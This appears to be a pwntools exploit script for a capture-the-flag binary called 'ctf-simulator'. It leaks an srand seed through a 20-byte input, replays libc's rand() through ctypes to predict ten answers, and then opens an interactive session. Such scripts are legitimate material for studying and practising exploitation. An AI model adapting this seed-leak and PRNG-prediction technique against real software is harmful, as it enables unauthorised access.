#! /usr/bin/python

from pwn import *
import ctypes


context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

up = lambda b: int.from_bytes(b, byteorder="little")

def start(binary):


    gs = '''
        init-pwndbg
        b *0x555555555411
        x/x *0x555555558444
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    p.recvuntil(b'[>]')

    p.sendline(b'A' * 20)
    leak = up(p.recvline().split(b" ")[2][20:])
    log.info(f"Leaked srand seed value {leak}")

    libc = ctypes.CDLL("/usr/lib/libc.so.6")

    libc.srand(leak)

    counter = 0xa
    for i in range(10):
        rand_val = libc.rand() % counter + 1
        p.recvuntil(b"[>] ")
        p.sendline(str(rand_val))
        counter *= 0xa

    p.interactive() 

if __name__=="__main__":
    file = './ctf-simulator'

    p = start(file)
          

    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
